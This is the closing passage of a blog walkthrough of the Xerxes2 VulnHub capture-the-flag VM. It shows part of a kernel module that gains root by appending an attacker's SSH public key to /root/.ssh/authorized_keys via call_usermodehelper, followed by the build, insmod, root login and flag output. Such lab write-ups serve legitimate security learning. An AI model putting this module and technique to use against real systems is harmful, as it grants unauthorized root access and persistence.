    call_usermodehelper<span style=color:#f92672>(</span>argv<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>, argv, envp, UMH_WAIT_EXEC<span style=color:#f92672>)</span>;
    printk<span style=color:#f92672>(</span>KERN_INFO <span style=color:#e6db74>&#34;Done usermodehelper...\n&#34;</span><span style=color:#f92672>)</span>;
    <span style=color:#66d9ef>return</span> 0;
<span style=color:#f92672>}</span>

static int __init hello_start<span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>
<span style=color:#f92672>{</span>
    printk<span style=color:#f92672>(</span>KERN_INFO <span style=color:#e6db74>&#34;Loading rooted module...\n&#34;</span><span style=color:#f92672>)</span>;
    <span style=color:#66d9ef>return</span> get_root<span style=color:#f92672>()</span>;
    <span style=color:#66d9ef>return</span> 0;
<span style=color:#f92672>}</span>

static void __exit hello_end<span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>
<span style=color:#f92672>{</span>
    printk<span style=color:#f92672>(</span>KERN_INFO <span style=color:#e6db74>&#34;Goodbye Mr.\n&#34;</span><span style=color:#f92672>)</span>;
<span style=color:#f92672>}</span>

module_init<span style=color:#f92672>(</span>hello_start<span style=color:#f92672>)</span>;
module_exit<span style=color:#f92672>(</span>hello_end<span style=color:#f92672>)</span>;
</code></pre></div><p>As can be seen in the code above, I added a function <code>get_root()</code>, that will append whatever is in <code>/tmp/pubkey</code> to <code>/root/.ssh/authorized_keys</code> using <code>call_usermodehelper</code>. <code>/tmp/pubkey</code> contained the public key of the keypair I generated at the beginning of starting Xerxes2. I modified <code>Makefile</code> to have <code>obj-m += rooted.o</code> this time, <code>make</code>&rsquo;d the source and ran the <code>insmod</code> for the newly build <code>rooted.ko</code>. Then, I inspected the kernel messages again, and attempted to login as root:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>korenchkin@xerxes2:~/kern$ vi rooted.c

korenchkin@xerxes2:~/kern$ vi Makefile

korenchkin@xerxes2:~/kern$ make
make -C /lib/modules/3.2.0-4-686-pae/build M<span style=color:#f92672>=</span>/home/korenchkin/kern modules
make<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>: Entering directory <span style=color:#e6db74>`</span>/usr/src/linux-headers-3.2.0-4-686-pae<span style=color:#e6db74>&#39;
</span><span style=color:#e6db74>  CC [M]  /home/korenchkin/kern/rooted.o
</span><span style=color:#e6db74>  Building modules, stage 2.
</span><span style=color:#e6db74>  MODPOST 1 modules
</span><span style=color:#e6db74>  CC      /home/korenchkin/kern/rooted.mod.o
</span><span style=color:#e6db74>  LD [M]  /home/korenchkin/kern/rooted.ko
</span><span style=color:#e6db74>make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;</span>

korenchkin@xerxes2:~/kern$ echo <span style=color:#e6db74>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6sCFrz036WAchGk66yROuY+hePiULr49D1E97wuK0mK4Uw0J+4u1ngDVw+h8xwtpxPZkOWcn7s86OkXcEkWzGoduC1Y+YMP0XnQFG4hdeX4yNypaAsLKZss6tTHe5kHzbTdiOUthSmiJHwyl39TXibSBILTnMOLaxzLM17xUCfJviRm2mOAq6uELYPPf8thzqVeBoIsdXfjh8QeLMRHloyjGe1ZeY0m4pqwg9d2azaBAirjBMv0cyk+1w51SNR61EQ6SRtc6BE7ayc6C+MZW4TkP/lwOQLH7CXrEoyL3bDskD6c9563jRSLtiVfzjfkjoyUDiTCWv/ThirZMqSot/&#34;</span> &gt; /tmp/pubkey

korenchkin@xerxes2:~/kern$ sudo insmod rooted.ko

korenchkin@xerxes2:~/kern$ dmesg | tail
<span style=color:#f92672>[</span>   14.512040<span style=color:#f92672>]</span> eth0: no IPv6 routers present
<span style=color:#f92672>[</span>  290.023022<span style=color:#f92672>]</span> Clocksource tsc unstable <span style=color:#f92672>(</span>delta <span style=color:#f92672>=</span> <span style=color:#ae81ff>4686567555</span> ns<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>  290.025022<span style=color:#f92672>]</span> Switching to clocksource acpi_pm
<span style=color:#f92672>[</span>57198.109946<span style=color:#f92672>]</span> bf<span style=color:#f92672>[</span>25367<span style=color:#f92672>]</span>: segfault at <span style=color:#ae81ff>40062000</span> ip <span style=color:#ae81ff>40062000</span> sp bfc6282c error <span style=color:#ae81ff>14</span>
<span style=color:#f92672>[</span>68192.983366<span style=color:#f92672>]</span> hello: module license <span style=color:#e6db74>&#39;unspecified&#39;</span> taints kernel.
<span style=color:#f92672>[</span>68192.983369<span style=color:#f92672>]</span> Disabling lock debugging due to kernel taint
<span style=color:#f92672>[</span>68192.983637<span style=color:#f92672>]</span> Loading hello module...
<span style=color:#f92672>[</span>74155.086393<span style=color:#f92672>]</span> Loading rooted module...
<span style=color:#f92672>[</span>74155.086397<span style=color:#f92672>]</span> Call Usermodehelper...
<span style=color:#f92672>[</span>74155.086449<span style=color:#f92672>]</span> Done usermodehelper...

korenchkin@xerxes2:~/kern$ logout
Connection to 192.168.56.102 closed.

root@kali:~/Desktop/xeres2# ssh root@192.168.56.102 -i delacroix

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____
<span style=color:#e6db74>`</span>MM<span style=color:#f92672>(</span>   <span style=color:#f92672>)</span>P<span style=color:#e6db74>&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span style=color:#ae81ff>\ </span> 6MMMMb
 <span style=color:#e6db74>`</span>MM<span style=color:#e6db74>`</span> ,P  6M<span style=color:#e6db74>&#39;  `Mb MM69 &#34;  `MM` ,P  6M&#39;</span>  <span style=color:#e6db74>`</span>Mb MM<span style=color:#e6db74>&#39;    ` MM&#39;</span>  <span style=color:#e6db74>`</span>Mb
  <span style=color:#e6db74>`</span>MM,P   MM    MM MM<span style=color:#e6db74>&#39;      `MM,P   MM    MM YM.           ,MM
</span><span style=color:#e6db74>   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
   d<span style=color:#e6db74>`</span>MM.  MM       MM        d<span style=color:#e6db74>`</span>MM.  MM            <span style=color:#e6db74>`</span>Mb   ,M<span style=color:#e6db74>&#39;
</span><span style=color:#e6db74>  d&#39;</span> <span style=color:#e6db74>`</span>MM. YM    d9 MM       d<span style=color:#e6db74>&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
_d_  _<span style=color:#f92672>)</span>MM_ YMMMM9 _MM_    _d_  _<span style=color:#f92672>)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM

root@xerxes2:~# id
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>

root@xerxes2:~# cat /root/flag.txt
____   ___  ____  ___  __ ____   ___  ____     ____     ____
<span style=color:#e6db74>`</span>MM<span style=color:#f92672>(</span>   <span style=color:#f92672>)</span>P<span style=color:#e6db74>&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span style=color:#ae81ff>\ </span> 6MMMMb
 <span style=color:#e6db74>`</span>MM<span style=color:#e6db74>`</span> ,P  6M<span style=color:#e6db74>&#39;  `Mb MM69 &#34;  `MM` ,P  6M&#39;</span>  <span style=color:#e6db74>`</span>Mb MM<span style=color:#e6db74>&#39;    ` MM&#39;</span>  <span style=color:#e6db74>`</span>Mb
  <span style=color:#e6db74>`</span>MM,P   MM    MM MM<span style=color:#e6db74>&#39;      `MM,P   MM    MM YM.           ,MM
</span><span style=color:#e6db74>   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
   d<span style=color:#e6db74>`</span>MM.  MM       MM        d<span style=color:#e6db74>`</span>MM.  MM            <span style=color:#e6db74>`</span>Mb   ,M<span style=color:#e6db74>&#39;
</span><span style=color:#e6db74>  d&#39;</span> <span style=color:#e6db74>`</span>MM. YM    d9 MM       d<span style=color:#e6db74>&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
_d_  _<span style=color:#f92672>)</span>MM_ YMMMM9 _MM_    _d_  _<span style=color:#f92672>)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM

    congratulations on beating xerxes2!

    I hope you enjoyed it as much as I did making xerxes2.
    xerxes1 has been described as <span style=color:#e6db74>&#39;weird&#39;</span> and <span style=color:#e6db74>&#39;left-field&#39;</span>
    and I hope that this one fits that description too :<span style=color:#f92672>)</span>

    Many thanks to @TheColonial &amp; @rasta_mouse <span style=color:#66d9ef>for</span> testing!

    Ping me on <span style=color:#75715e>#vulnhub for thoughts and comments!</span>

                      @barrebas, July <span style=color:#ae81ff>2014</span>
root@xerxes2:~#
</code></pre></div><h2 id=conclusion>conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2>
<p>Xerxes2 really challenged me into learning a ton of new things so this Vulnerable VM was a total win for me! Thanks <a href=https://twitter.com/barrebas>@barrebas</a> and <a href=https://twitter.com/VulnHub>@VulnHub</a> for another great learning opportunity.</p>
<p>Now, the next step? OSCP :)</p>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2014/08/15/taming-the-troll/>
<span class=title>« Prev Page</span>
<br>
<span>taming the troll</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2014/08/07/flick-can-you-find-the-flag/>
<span class=title>Next Page »</span>
<br>
<span>flick can you find the flag?</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Beating Xerxes2 on twitter" href="https://twitter.com/intent/tweet/?text=Beating%20Xerxes2&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Beating Xerxes2 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2&summary=Beating%20Xerxes2&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Beating Xerxes2 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f&title=Beating%20Xerxes2"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Beating Xerxes2 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Beating Xerxes2 on whatsapp" href="https://api.whatsapp.com/send?text=Beating%20Xerxes2%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Beating Xerxes2 on telegram" href="https://telegram.me/share/url?text=Beating%20Xerxes2&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f08%2f09%2fbeating-xerxes2%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>